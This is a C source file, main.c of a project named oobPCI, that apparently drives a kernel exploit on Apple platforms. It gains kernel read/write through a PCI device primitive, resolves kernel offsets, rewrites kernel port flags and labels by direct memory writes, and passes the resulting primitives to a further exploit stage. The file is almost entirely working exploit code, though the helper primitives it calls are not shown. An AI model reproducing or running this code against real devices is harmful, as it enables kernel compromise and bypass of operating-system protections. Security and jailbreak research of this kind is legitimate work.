//
//  main.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright Â© 2022 Pinauten GmbH. All rights reserved.
//

#include <stdio.h>
#include <sys/errno.h>
#include <IOKit/IOKitLib.h>
#include <stdbool.h>

#include "includeme.h"
#include "oobPCI.h"
#include "offsets.h"

extern void mach_init(void);

void unlabelPort(mach_port_t port) {
    uint64_t kPort = portGetKPort(port);
    guard (kPort != 0) else {
        puts("unlabelPort: Failed to get kPort!");
        exit(-1);
    }
    
    uint8_t flags = pcidev_r8(kPort + 1);
    flags &= ~0x4;
    pcidev_w8(kPort + 1, flags);
    
    PORT_LABEL_SET(kPort, 0);
}

void __attribute__((noreturn)) sleepForever(void) {
    mach_port_t port = 0;
    mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port);
    
    uint8_t rcvBuf[1024];
    while (1) {
        mach_msg((mach_msg_header_t*) rcvBuf, MACH_RCV_MSG|MACH_RCV_LARGE, 0, 1024, port, 0, 0);
    }
}

int main(int argc, const char * argv[]) {
    mach_init();
    
    status_update("Gaining r/w");
    
    uint64_t kBase = 0, virtBase = 0, physBase = 0;
    guard (oobPCI_init(&kBase, &virtBase, &physBase)) else {
        puts("[-] oobPCI failed!");
        return -1;
    }
    
    status_update("Patchfinding");
    resolveKernelOffsets(kBase);
    
    unlabelPort(gDKServerPort);
    unlabelPort(gIOPCIDev);
    
    void (*krwDone)(mach_port_t, mach_port_t, uint64_t, uint64_t, uint64_t, uint64_t) = (void(*)(mach_port_t, mach_port_t, uint64_t, uint64_t, uint64_t, uint64_t)) DBG_EXPLOIT_FUNC(5);
    krwDone(gDKServerPort, gIOPCIDev, pcidev_get_base_offset(), kBase, virtBase, physBase);
    
    sleepForever();
    
    return 0;
}
